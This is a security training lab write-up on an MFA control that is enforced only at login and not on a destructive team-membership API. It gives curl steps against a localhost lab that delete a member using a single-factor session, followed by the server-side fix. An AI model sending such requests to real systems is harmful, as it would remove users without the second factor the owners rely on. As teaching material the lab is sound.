# Lab 04 — MFA Not Enforced Server-Side on Destructive Action

**Mirrors:** Report 5 — *Broken Authentication / MFA Not Enforced Server-Side for Sensitive Account Management Endpoints*
**Class:** Improper access control · **Severity:** High

## The story

The product documentation states MFA is **mandatory** for owners/admins to manage
accounts. But MFA is enforced only as a UI/login gate — the destructive API
(remove a team member) never checks whether the caller actually has MFA enabled.
A single-factor session is enough to perform an MFA-"protected" action.

## Recon first (BundleBleed)

Hidden destructive endpoint mined from the bundle:

```
DELETE /api-internal/v2/memberships/{id}?organizationId=<ORG>
```

## Reproduce

1. Log in as a user whose **MFA is off** — but who can still hold an owner-ish
   session. In this lab, use `owner@acme.test` and imagine MFA was toggled off,
   or observe that the server never checks the flag at all.
2. List team memberships:

```bash
curl 'http://localhost:4000/api-internal/v2/memberships?organizationId=org_ACME0001' \
  -H "Cookie: SESSIONID=<your-session>"
```

3. Delete one — note the CSRF header is required (as in the real report), MFA is
   **not**:

```bash
curl -X DELETE 'http://localhost:4000/api-internal/v2/memberships/mem_vince?organizationId=org_ACME0001' \
  -H "Cookie: SESSIONID=<your-session>" \
  -H "X-Csrf-Token: <your-csrf-token>"
```

4. **Result:** `{"ok":true,"removed":"mem_vince","mfaWasEnforced":false}` — the
   member is gone, no second factor was ever required.

## Why it matters

An MFA control that only guards the front door but not the sensitive back-end
actions gives a false sense of security. An attacker with a stolen session (no
MFA prompt) can perform exactly the destructive operations MFA was supposed to
protect.

## The fix

Check the factor at the action, not just at login:

```js
if (!req.user.mfaEnabled)
  return res.status(403).json({ error: "MFA required for this action" });
```
